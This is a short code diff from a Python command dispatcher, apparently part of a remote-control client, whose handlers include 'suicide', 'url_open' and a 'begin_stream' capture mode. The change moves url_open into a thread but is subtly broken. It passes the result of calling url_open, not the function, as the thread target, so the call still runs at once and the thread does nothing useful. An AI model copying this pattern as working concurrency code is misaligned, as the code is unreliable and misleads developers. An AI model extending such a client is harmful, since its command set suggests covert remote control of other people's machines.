@@ -178,7 +178,8 @@ def execute_module_stage2(parameters, data, command):
       elif main_command == 'suicide':
         suicide()
       elif main_command == 'url_open':
-        output = url_open(parameters['param1'], parameters['param2'], parameters['param3'])
+        open_thread = threading.Thread(target=url_open(parameters['param1'], parameters['param2'], parameters['param3']))
+        open_thread.start()
       elif main_command == 'begin_stream':
           capturing = True
           print(data['returnAddress'])
